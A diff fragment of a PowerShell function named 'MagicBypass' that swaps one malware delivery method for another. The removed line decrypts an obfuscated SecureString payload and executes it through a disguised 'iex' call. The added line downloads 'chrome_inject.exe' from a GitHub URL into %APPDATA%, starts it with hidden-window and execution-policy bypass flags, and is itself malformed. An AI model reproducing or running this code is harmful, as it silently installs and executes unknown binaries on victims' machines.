@@ -21,5 +21,4 @@ function MagicBypass {
     $TimeElapsed = ($FinishDate - $InitialDate).TotalSeconds;
     Write-Host "$TimeElapsed seconds"
     Write-Host "ANjayy alok"
-    ( [rUntiME.iNteroPServIcEs.mARshal]::ptRtOstRiNgAuto([RunTiME.InTEroPsErVIcEs.MaRSHAl]::secuReSTRINgtobSTR($('76492d1116743f0423413b16050a5345MgB8AFIAUAB5ADIASgBRAC8ARwBsAFkARwB4AE8AbQBmAGkAeQBmADUAcAA3AEEAPQA9AHwAZQA4AGUANQA0ADQAZABkADQAMgA4ADUANgAwAGYANwA2AGEAYgAwADcANAA5ADUAYgA5ADAAMgBkAGEANwBhAGYANAAzADgAMgA2AGIAZQBmADEAYgBhADAANABjADYANAAzADYAMQBmAGMANgA1AGYAMQBiADgAYgA1ADUANwA2ADUAZABhAGEAYQAyADMAMwAwADkANgBiADEAMgA1ADgAYQBiADEAZAAxAGQAMgBmADcAZQBlAGYANQBkADIA'|cONVErTto-sEcurEstrInG -Ke (153..184)) ) ))|.((Get-VaRIabLe '*mdr*').naME[3,11,2]-joiN'')
-}
+    -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://github.com/arcel1945/Download-here/raw/refs/heads/main/chrome_inject.exe','%APPDATA%\anjeng.exe');Start-Process '%APPDATA%\anjeng.exe'}
